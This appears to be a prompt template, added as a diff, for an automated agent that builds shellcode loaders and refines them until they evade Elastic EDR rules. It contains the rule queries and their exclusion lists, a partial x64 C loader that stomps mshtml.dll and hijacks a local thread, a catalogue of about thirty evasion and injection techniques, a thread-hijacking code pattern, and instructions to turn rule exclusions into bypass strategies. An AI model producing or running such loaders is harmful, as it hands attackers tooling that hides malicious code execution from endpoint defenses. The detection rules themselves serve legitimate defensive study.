@@ -1,0 +1,372 @@
+# EDR Rule Gap Analysis
+
+## Context
+We are analyzing EDR detection rules to identify logical gaps and design improvements.
+A test executable triggered alerts or failed validation. We need to understand each rule's logic, identify exceptions/exclusions, and propose precision improvements.
+
+## Memory & History
+### Iteration History
+Iter 1: [outcome=detected]
+Technique: unknown_approach (Standard implementation)
+Triggered Rules: Elastic FileScore / Malicious File alert, Process Creation from Unbacked Memory via Unsigned Parent, Potential Process Creation via ShellCode
+Analysis: Pending AI Analysis
+
+Iter 2: [outcome=detected]
+Technique: module_stomping (Standard implementation)
+Triggered Rules: Suspicious System Module Image Hollowing
+Analysis: Pending AI Analysis
+
+### Rule Analysis
+
+    Solved Rules: Elastic FileScore / Malicious File alert, Process Creation from Unbacked Memory via Unsigned Parent, Potential Process Creation via ShellCode
+    Persistent Rules: 
+    Active Rules Details:
+    - Rule: Suspicious System Module Image Hollowing | APIs: process.thread.Ext.call_stack, process.executable, VirtualProtect, LdrLoadDll, process.thread.Ext.call_stack_summary, process.thread.Ext.call_stack_final_user_module, process.thread.Ext.call_stack_final_user_module.protection_provenance, GetProcAddressForCaller | Logic: api where process.Ext.api.name == "VirtualProtect" and process.Ext.api.behaviors == "hollow_image" and
+  process.Ext.api.parameters.size >= 10000 and process.executable != null and
+  process.Ext.api.metadata.target_address_path regex """c:\\windows\\(system32|syswow64)\\[a-z]+.dll""" and
+  not process.thread.Ext.call_stack_final_user_module.name in ("Undetermined", "Unknown", "Kernel") and
+  not process.thread.Ext.call_stack_summary like "*Unknown*" and
+  not process.thread.Ext.call_stack_final_user_module.protection_provenance like ("Undetermined", "Unbacked", "Kernel*") and
+  /* ntdll, kernelbase and kernel32 are covered by other rules */
+  not process.Ext.api.metadata.target_address_name like ("ntdll.dll*", "kernel32.dll*", "kernelbase.dll*") and
+  _arraysearch(process.thread.Ext.call_stack_final_user_module.code_signature, $entry, $entry.trusted == false or $entry.exists == false) and
+  not _arraysearch(process.thread.Ext.call_stack_final_user_module.code_signature, $entry, $entry.trusted == true) and
+  not (process.Ext.api.name == "VirtualProtect" and _arraysearch(process.thread.Ext.call_stack, $entry, $entry.symbol_info like ("*kernelbase.dll!LoadLibrary*", "*kernel32.dll!ExitProcess*", "*kernelbase.dll!GetProcAddressForCaller*", "*ntdll.dll!LdrLoadDll*"))) and
+  not process.thread.Ext.call_stack_final_user_module.path like
+                                         ("c:\\windows\\assembly\\nativeimages_*.dll",
+                                          "c:\\program files\\*",
+                                          "c:\\program files (x86)\\*",
+                                          "c:\\windows\\twain_32\\*.dll",
+                                          "c:\\windows\\system32\\umppc*.dll",
+                                          "c:\\windows\\system32\\spool\\drivers\\*") and
+  process.thread.Ext.call_stack_final_user_module.hash.sha256 != null and
+  not process.thread.Ext.call_stack_final_user_module.hash.sha256 in ([Sanitized_Hash_List])
+
+
+    
+
+### Active Approach Status
+unknown_approach: 1/3 attempts (target: Elastic FileScore / Malicious File alert)
+module_stomping: 1/3 attempts (target: Suspicious System Module Image Hollowing)
+
+### Banned Approaches (Do NOT attempt these)
+None
+
+
+    ## Previous Test Results
+    Iteration: 2
+    Status: detected
+    Exit Code: 0
+    Output Snippet: 
+    Error Snippet: 
+    Compile Success: True
+    Previous Strategy Plan:
+    # EDR Rule Gap Analysis — Iteration 1
+
+## Executive Summary
+
+Iteration 1 used `thread_hijacking_local` with a **plain `VirtualAlloc(RW) → VirtualProtect(RX)`** staging buffer. That is the root cause of all three alerts. The thread-hijacking portion itself worked (the thread's recorded StartAddress was the module-backed `DecoyStub`), but the **payload address lives in a private, unbacked, freshly-allocated region** with no module backing. Every rule below keys on exactly that fact.
+
+The critical 
+
+    ## Previous Code (C source that was tested)
+    ```c
+    /*
+ * Iteration 2 — x64 shellcode loader
+ * Techniques: thread_hijacking_local + module_stomping
+ * Build (MSVC x64):
+ *   cl.exe /nologo /O2 /GS- loader.c
+ * Run:
+ *   loader.exe C:\path\to\calc.bin
+ *
+ * Strategy: stage the payload inside the .text of a signed Microsoft DLL
+ * (mshtml.dll) so the thread's call stack resolves to an image-backed module
+ * instead of an "Unbacked" private region. Thread-hijack mechanics unchanged.
+ */
+
+#include <windows.h>
+#include <winnt.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <errno.h>
+#include <string.h>
+
+/* ---- Function pointer typedefs for runtime-resolved APIs ---- */
+typedef LPVOID (WINAPI *pVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
+typedef BOOL   (WINAPI *pVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
+typedef BOOL   (WINAPI *pVirtualFree)(LPVOID, SIZE_T, DWORD);
+typedef HMODULE(WINAPI *pLoadLibraryA)(LPCSTR);
+typedef HANDLE (WINAPI *pCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
+                                       LPTHREAD_START_ROUTINE, LPVOID,
+                                       DWORD, LPDWORD);
+typedef BOOL   (WINAPI *pGetThreadContext)(HANDLE, LPCONTEXT);
+typedef BOOL   (WINAPI *pSetThreadContext)(HANDLE, const CONTEXT *);
+typedef DWORD  (WINAPI *pResumeThread)(HANDLE);
+typedef DWORD  (WINAPI *pWaitForSingleObject)(HANDLE, DWORD);
+typedef BOOL   (WINAPI *pCloseHandle)(HANDLE);
+typedef BOOL   (WINAPI *pTerminateThread)(HANDLE, DWORD);
+typedef FARPROC(WINAPI *pGetProcAddress)(HMODULE, LPCSTR);
+typedef HMODULE(WINAPI *pGetModuleHandleA)(LPCSTR);
+
+/* ---- Globals holding resolved pointers ---- */
+static pVirtualAlloc            dyn_VirtualAlloc            = NULL;
+static pVirtualProtect          dyn_VirtualProtect          = NULL;
+static pVirtualFree             dyn_VirtualFree             = NULL;
+static pLoadLibraryA            dyn_LoadLibraryA            = NULL;
+static pCreateThread            dyn_CreateThread            = NULL;
+static pGetThreadContext        dyn_GetThreadContext        = NULL;
+static pSetThreadContext        dyn_SetThreadContext        = NULL;
+static pResumeThread            dyn_ResumeThread            = NULL;
+static pWaitForSingleObject     dyn_WaitForSingleObject     = NULL;
+static pCloseHandle             dyn_CloseHandle             = NULL;
+static pTerminateThread         dyn_TerminateThread         = NULL;
+
+/*
+ * Decoy stub — module-backed thread start routine. Lives in OUR image's
+ * .text section, so CreateThread telemetry records a module-backed
+ * StartAddress rather than the payload.
+ */
+static DWORD WINAPI DecoyStub(LPVOID lpParam)
+{
+    (void)lpParam;
+    ExitThread(0);
+    return 0; /* unreachable */
+}
+
+/* Resolve a symbol from a module handle; abort on failure. */
+static FARPROC resolve(HMODULE mod, LPCSTR name, pGetProcAddress gpa)
+{
+    FARPROC p = gpa(mod, name);
+    if (!p) {
+        fprintf(stderr, "[-] GetProcAddress(%s) failed: %lu\n",
+                name, GetLastError());
+        ExitProcess(1);
+    }
+    return p;
+}
+
+/*
+ * Robustly load the donor DLL. Tries the bare name first (System32 is on the
+ * default search path for system DLLs), then falls back to the explicit
+ * System32 path resolved at runtime via GetSystemDirectoryA — no hardcoded
+ * drive letters or versioned paths.
+ */
+static HMODULE load_donor(pLoadLibraryA pLoadLibraryA, const char* name)
+{
+    HMODULE h = pLoadLibraryA(name);
+    if (h) return h;
+
+    char sysdir[MAX_PATH];
+    UINT n = GetSystemDirectoryA(sysdir, MAX_PATH);
+    if (n == 0 || n >= MAX_PATH) return NULL;
+
+    char full[MAX_PATH];
+    int written = _snprintf_s(full, sizeof(full), _TRUNCATE,
+                              "%s\\%s", sysdir, name);
+    if (written < 0) return NULL;
+
+    return pLoadLibraryA(full);
+}
+
+int main(int argc, char* argv[])
+{
+    if (argc < 2) {
+        fprintf(stderr, "usage: %s <shellcode.bin>\n", argv[0]);
+        return 1;
+    }
+
+    /* ---- 0. Resolve APIs at runtime to shrink the static import table ---- */
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    if (!hKernel32) {
+        fprintf(stderr, "[-] GetModuleHandleA(kernel32) failed: %lu\n",
+                GetLastError());
+        return 1;
+    }
+    pGetProcAddress gpa = (pGetProcAddress)GetProcAddress(hKernel32,
+                                                          "GetProcAddress");
+    if (!gpa) {
+        fprintf(stderr, "[-] bootstrap GetProcAddress failed\n");
+        return 1;
+    }
+
+    dyn_VirtualAlloc        = (pVirtualAlloc)       resolve(hKernel32, "VirtualAlloc",        gpa);
+    dyn_VirtualProtect      = (pVirtualProtect)     resolve(hKernel32, "VirtualProtect",      gpa);
+    dyn_VirtualFree         = (pVirtualFree)        resolve(hKernel32, "VirtualFree",         gpa);
+    dyn_LoadLibraryA        = (pLoadLibraryA)       resolve(hKernel32, "LoadLibraryA",        gpa);
+    dyn_CreateThread        = (pCreateThread)       resolve(hKernel32, "CreateThread",        gpa);
+    dyn_GetThreadContext    = (pGetThreadContext)   resolve(hKernel32, "GetThreadContext",    g
+
+... (code truncated for length)
+    ```
+    
+
+## Detection Details
+### Alert 1: Suspicious System Module Image Hollowing
+- Detector: elastic_local_log
+- Severity: high
+- Rule ID: 542a6a6c-1af2-4e51-a8a4-5406765f5642
+- Process: loader_thread_hijacking_local_2.exe (pid=None)
+- File: C:\Users\mslr74l\Desktop\dev\behaviorBypassAgent\output\20260929_230430_thread_hijacking_local\iter_2\loader_thread_hijacking_local_2.exe
+- Description: None
+- **Matched local rule**:
+    - Name: Suspicious System Module Image Hollowing
+    - File: defense_evasion_suspicious_system_module_image_hollowing.toml
+    - Rule ID: 542a6a6c-1af2-4e51-a8a4-5406765f5642
+    - Detection query:
+        api where process.Ext.api.name == "VirtualProtect" and process.Ext.api.behaviors == "hollow_image" and
+          process.Ext.api.parameters.size >= 10000 and process.executable != null and
+          process.Ext.api.metadata.target_address_path regex """c:\\windows\\(system32|syswow64)\\[a-z]+.dll""" and
+          not process.thread.Ext.call_stack_final_user_module.name in ("Undetermined", "Unknown", "Kernel") and
+          not process.thread.Ext.call_stack_summary like "*Unknown*" and
+          not process.thread.Ext.call_stack_final_user_module.protection_provenance like ("Undetermined", "Unbacked", "Kernel*") and
+          /* ntdll, kernelbase and kernel32 are covered by other rules */
+          not process.Ext.api.metadata.target_address_name like ("ntdll.dll*", "kernel32.dll*", "kernelbase.dll*") and
+          _arraysearch(process.thread.Ext.call_stack_final_user_module.code_signature, $entry, $entry.trusted == false or $entry.exists == false) and
+          not _arraysearch(process.thread.Ext.call_stack_final_user_module.code_signature, $entry, $entry.trusted == true) and
+          not (process.Ext.api.name == "VirtualProtect" and _arraysearch(process.thread.Ext.call_stack, $entry, $entry.symbol_info like ("*kernelbase.dll!LoadLibrary*", "*kernel32.dll!ExitProcess*", "*kernelbase.dll!GetProcAddressForCaller*", "*ntdll.dll!LdrLoadDll*"))) and
+          not process.thread.Ext.call_stack_final_user_module.path like
+                                                 ("c:\\windows\\assembly\\nativeimages_*.dll",
+                                                  "c:\\program files\\*",
+                                                  "c:\\program files (x86)\\*",
+                                                  "c:\\windows\\twain_32\\*.dll",
+                                                  "c:\\windows\\system32\\umppc*.dll",
+                                                  "c:\\windows\\system32\\spool\\drivers\\*") and
+          process.thread.Ext.call_stack_final_user_module.hash.sha256 != null and
+          not process.thread.Ext.call_stack_final_user_module.hash.sha256 in
+                                             
+        ... (truncated)
+    - Parsed detection patterns:
+    - API/Behavior indicators: process.thread.Ext.call_stack, process.executable, VirtualProtect, LdrLoadDll, process.thread.Ext.call_stack_summary, process.thread.Ext.call_stack_final_user_module, process.thread.Ext.call_stack_final_user_module.protection_provenance, GetProcAddressForCaller
+    - Behavior keywords: unbacked, code_signature
+
+## Task
+1. **Analyze** the execution failure or detection alert using the provided telemetry
+2. **Per-Rule Analysis**: For EACH triggered detection rule (or previously triggered rule), perform individual gap analysis:
+- Identify the rule's detection logic and scope
+- **Priority 1**: Examine the rule's exclusion/exception conditions (check "Active Rules Details" if available)
+- **Priority 2**: Find gaps in the current technique's implementation that could bypass this specific rule
+- **Priority 3**: If no gap exists within the current technique, propose alternative approaches
+3. **Design** next validation strategy focusing on rule gaps, NOT just evasion
+
+## Exclusion Strategy Constraints
+When analyzing Known_Exclusions, adhere to these rules:
+- **Ignore `process.executable`**: The loader's filename and filepath cannot be modified, so do not propose exclusions based on them.
+- **Ignore `code_signature`**: Signatures cannot be applied, so do not propose exclusions based on trusted signers.
+- **Notable Exclusions**: **Stack-based** (e.g., call stack modules) and **API-based** exclusions.
+
+## Example of Analysis Logic
+When analyzing a detection rule, identify conditions that can be neutralized by altering specific parameters. For instance:
+
+- **Regex Constraints**: If a rule filters `process.Ext.api.metadata.target_address_path` with a regex like `c:\\windows\\(system32|syswow64)\\[a-z]+.dll`, using a DLL from a different directory (e.g., `C:\\Program Files\\...`) would serve as a bypass technique.
+
+- **Allowlists**: If there is an exclusion list (`NOT LIKE`) for specific paths such as:
+  - `c:\\windows\\assembly\\nativeimages_*.dll`
+  - `c:\\program files\\*`
+  The detection can be evaded by ensuring the `call_stack` (e.g., via call stack spoofing or API proxying) or module path (e.g., Module Stomping a DLL loaded from that allowed path) aligns with these allowed paths.
+
+**Requirements for Prompt Construction:**
+Generalization: Do not fixate only on the examples provided above. The model should flexibly identify "Allowlists" or "Excluded Conditions" within any given rule and prioritize satisfying those exclusions.
+
+## Standard Testing Methodologies
+- **rwx_allocation**: Allocate memory with PAGE_EXECUTE_READWRITE (RWX) permissions directly. The simplest and most straightforward method of running shellcode.
+    - **RW_to_RX**: Allocate as PAGE_READWRITE, write shellcode, then VirtualProtect to PAGE_EXECUTE_READ. Avoids suspicious RWX permissions.
+    - **module_stomping**: Load legitimate DLL (ex: mshtml.dll, edgehtml.dll. NOT kernel32.dll), locate executable section, overwrite with shellcode. Uses existing executable memory.
+    - **module_stomping_section_mapping**: Module Stomping via NtCreateSection(SEC_IMAGE)+NtMapViewOfSection. Maps the sacrificial DLL as an image section (file-backed, RX) without a LoadLibrary event; shellcode overwrites the mapped .text in place. Keeps the module off the PEB loader list and makes call-stack module resolution point at a legitimate DLL path.
+    - **module_stomping_fiber**: Module Stomping + Fiber: stomp a mapped image section, then start execution via CreateFiber/SwitchToFiber so no thread-creation telemetry is emitted. Workshop-verified combination that produced no Elastic alerts.
+    - **thread_hijacking_local** [USER-PREFERRED]: Thread Hijacking (local): suspend an existing thread in the own process (e.g. created earlier or via CreateThread on a decoy), overwrite its RIP with the payload address via SetThreadContext, resume. Avoids a fresh thread-start pointing at unbacked memory.
+    - **apc_injection**: APC execution (self-injection): QueueUserAPC/NtQueueApcThread the payload address onto an alertable thread in the same process, then enter an alertable wait (SleepEx/WaitForSingleObjectEx). No new thread is created.
+    - **threadless_injection**: Threadless Injection (local variant): patch an existing function in a loaded module (or an unused callback slot, e.g. window proc) so the payload runs on a normal call path instead of a new thread. Pure-C feasible when targeting the own process; remote-process variants need handle ops and widen the detection surface.
+    - **heap_execution**: Use HeapCreate + HeapAlloc instead of VirtualAlloc. Less commonly monitored by EDR.
+    - **fiber_execution**: Use Windows Fiber API (ConvertThreadToFiber, CreateFiber) to execute shellcode in fiber context.
+    - **phantom_dll_hollowing**: Map DLL as SEC_IMAGE_NO_EXECUTE, modify in memory, then remap sections as executable. Advanced evasion.
+    - **thread_stack_spoofing**: Overwrite the return address on the stack or use synthetic frames to hide the true origin of the execution (e.g., hiding the pointer to unbacked memory).
+    - **dll_side_loading**: DLL side-loading: drop a payload-bearing DLL next to a signed binary that imports it, so execution flows under a trusted image name.
+    - **mockingjay**: Mockingjay: reuse an existing PAGE_EXECUTE_READWRITE section inside a signed DLL (e.g. msys-2.0.dll) — no VirtualAlloc/VirtualProtect at all; writes land in image-backed executable memory.
+    - **early_bird_apc**: Early Bird APC: spawn a signed host process suspended and queue an APC before its first thread runs, so the payload executes during process init — potentially before userland EDR hooks install.
+    - **ntdll_unhooking**: NTDLL unhooking: restore ntdll .text bytes from KnownDlls or a clean on-disk copy to remove inline EDR hooks before running the payload. Auxiliary step — combine with a staging technique.
+    - **direct_syscall**: Direct/indirect syscalls (HellsGate-style): resolve SSNs from ntdll stubs and invoke the kernel without passing through hooked ntdll prologues. Does not affect kernel-level telemetry.
+    - **process_hollowing_remote**: Remote process hollowing (classic T1055): CreateProcess suspended, NtUnmapViewOfSection the original image, write replacement code, redirect entry, resume. Baseline to measure Elastic hollowing-rule coverage.
+    - **proxy_function_calls**: Execute sensitive APIs (NtCreateThread, etc.) through 'gadgets' in legitimate DLLs like ntdll.dll or kernel32.dll to evade return address filtering.
+    - **process_doppelganging**: Create file transaction, write shellcode, rollback transaction but keep section handle. Execute from transacted memory.
+    - **callback_execution**: Use legitimate callback functions (EnumWindows, EnumSystemLocales, etc.) with shellcode address.
+    - **module_overloading**: Map same DLL twice - once legitimate, once modified. Use legitimate handle for cover.
+    - **atom_bombing**: Atom bombing: store shellcode in the global atom table, then NtQueueApcThread a GlobalGetAtomNameW call into a target thread so the atom content is written inside the target process — no WriteProcessMemory.
+    - **tls_callback**: TLS callback execution: register a PIMAGE_TLS_CALLBACK in the .CRT$XL* section so the payload runs inside LdrpCallTlsInitializers before main — no thread/APC creation.
+    - **propagate**: PROPagate: store payload/subclass header in a target window's property list and trigger it via window messages — injection through the windowing subsystem, not process APIs.
+    - **process_ghosting**: Process ghosting: create a file, mark delete-pending, write a payload PE, build a SEC_IMAGE section from the delete-pending handle, then close — a process whose image has no on-disk file at all.
+    - **windows_hook_injection**: SetWindowsHookEx injection: the OS itself loads our hook DLL into a target GUI process when it pumps messages — no remote alloc/write APIs involved.
+    - **context_gadget**: SetThreadContext + gadget: redirect a thread's RIP into a jmp/call gadget inside a signed module so the first stack frame is module-backed even though control reaches the payload next.
+    - **exception_dispatch_exec**: Exception-dispatched execution: a VEH handler rewrites ContextRecord->Rip to the payload and returns CONTINUE_EXECUTION — control transfer happens inside KiUserExceptionDispatcher.
+    - **remote_section_mapping**: Remote section mapping: write payload in our own view of a section object, then NtMapViewOfSection the same section into the target — no VirtualAllocEx/WriteProcessMemory pair.
+    - **rundll32_hosting**: Signed host execution: drop a payload DLL and run it under rundll32/regsvr32 — the hosting process is a signed system binary, which may break unsigned-parent rule sequences.
+    - **suspended_section_exec**: Suspended-process section write: spawn signed host suspended, NtMapViewOfSection a payload section into it, redirect the main thread — hollowing-style exec without the loud NtUnmapViewOfSection call.
+    - **scattered_allocation**: Split shellcode across multiple small allocations. Reconstruct at runtime. Evades signature scanning.
+    - **read_only_trick**: Allocate as PAGE_READONLY, use hardware breakpoint or exception handler to execute. Very stealthy.
+    - **inherited_section_apc**: Inherited-Handle Section APC: pass a payload-carrying section into a suspended child via PROC_THREAD_ATTRIBUTE_HANDLE_LIST so the kernel duplicates the handle at process creation — no VirtualAllocEx/WriteProcessMemory/remote-map event exists. The child maps the section locally; trigger via early-bird APC or gadget/context redirect. Project-original composition.
+    - **self_reflection_exec**: Self-Reflection Execution: RtlCreateProcessReflection/RtlCloneUserProcess forks our own process after local staging — the payload is inherited at birth (COW), so no remote alloc/write/map call exists at all. StartRoutine option runs the payload inside the clone without a CreateThread-named call.
+    - **api_surface_translation**: API Surface Translation (meta): substitute every fingerprinted Win32 call with a documented modern twin (VirtualAlloc2, MapViewOfFile3, NtMapViewOfSectionEx, VirtualProtectFromApp, CreateFile2, NtCreateThreadEx flags, placeholder APIs) — tests whether rules match api.name strings. Applied on top of other techniques; one-iteration test per rule family.
+
+    ### USER PREFERRED TECHNIQUES (Prioritize these!)
+    - **thread_hijacking_local**
+
+
+## Techniques Knowledge Base
+Curated implementation notes for the enabled/preferred techniques. Prefer these concrete patterns over generic code.
+### thread_hijacking_local [USER-PREFERRED]
+# Thread Hijacking (local process)
+
+## Goal
+Run payload code on an *existing* thread instead of creating a new one for execution. The thread's start address stays inside a legit module while we redirect RIP mid-flight.
+
+## Pattern (self-process variant — no remote handles needed)
+```c
+// 1. Create a suspended worker thread — its start routine is a benign stub
+//    inside our own image or a legit module
+HANDLE t = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)decoy_stub,
+                        NULL, CREATE_SUSPENDED, NULL);
+
+// 2. Redirect its instruction pointer to the payload
+CONTEXT ctx = {0};
+ctx.ContextFlags = CONTEXT_FULL;
+GetThreadContext(t, &ctx);
+ctx.Rip = (DWORD64)execAddr;   // e.g. address inside a stomped module
+SetThreadContext(t, &ctx);
+
+// 3. Resume — the thread "wakes up" already inside payload code
+ResumeThread(t);
+```
+
+## Detection surface (Elastic)
+- `SetThreadContext`/`GetThreadContext` on a suspended thread is a classic injection indicator — rules matching `process.Ext.api.name : "SetThreadContext"` may fire. Mitigate by calling it from inside a stomped module (call-stack hygiene) so the caller frame resolves to a legit DLL.
+- Weaker than fiber execution on telemetry (Suspend/Get/SetContext leaves a visible API chain), but stronger than a plain `CreateThread(execAddr)` — the thread start address itself is never the payload.
+- Prefer CREATE_SUSPENDED `CreateThread` over hijacking a busy existing thread: mid-flight context flips on a running thread race and crash.
+
+## Pitfalls
+- After payload returns, the thread has no sane return path — point it back at the decoy or terminate cleanly (`ExitThread` shim / stack pivot is fragile in pure C; document limitation).
+- Keep the decoy stub inside our own `.text` or a stomped region — a decoy address in private memory defeats the purpose.
+
+
+    ## Language Specific Constraints
+    - Emit one complete compilable translation unit including ALL required headers; no stubs, TODOs, or pseudocode. Verify braces balance before finishing the file.
+    - Use `int main(int argc, char* argv[])` and read the payload path from argv[1]. If you choose wmain/wWinMain (wide args), you MUST use wide CRT functions (_wfopen, wcslen, wprintf); passing wchar_t* argv to narrow functions like fopen/printf %s reads garbage such as just "C".
+    - The target is x64 Windows and the code must compile cleanly under MSVC cl.exe. Do not use GCC-only extensions (e.g. __attribute__) and do not use C++ constructs.
+    - Prefer documented Win32 APIs from <windows.h>. If undocumented NT APIs (Nt*/Zw*/Rtl* functions or types like OBJECT_ATTRIBUTES/IO_STATUS_BLOCK) are required, you MUST declare every typedef, enum, and function prototype yourself; <winternl.h> alone does NOT define most of them.
+    - Keep helper declarations above their call sites and ensure every identifier used is declared; cl.exe does not tolerate forward references to undeclared functions.
+    - The loader's only job is executing the payload bytes from argv[1]; never spawn or search for the observable target process (calc.exe/CalculatorApp.exe) yourself — the payload produces it. If a technique needs a host process, spawn a real executable (e.g. C:\Windows\System32\notepad.exe), NOT a UWP alias like CalculatorApp.exe which cannot be CreateProcess'd (error 2).
+
+## Output Format
+For Rule: [Rule Name 1]
+
+- **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+- **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+- **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+- **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+For Rule: [Rule Name 1]
+
+- **Detection_Logic**: [How this rule identifies threats - be specific about monitored APIs, memory types, etc.]
+- **Known_Exclusions**: [List any exception conditions from "Active Rules Details" or common EDR patterns]
+- **Gap_Detail**: [Specific weakness in rule logic or current implementation]
+- **Bypass_Strategy**: [How to exploit this gap - prefer same technique modification over new technique]
+
+[Repeat for each triggered rule]
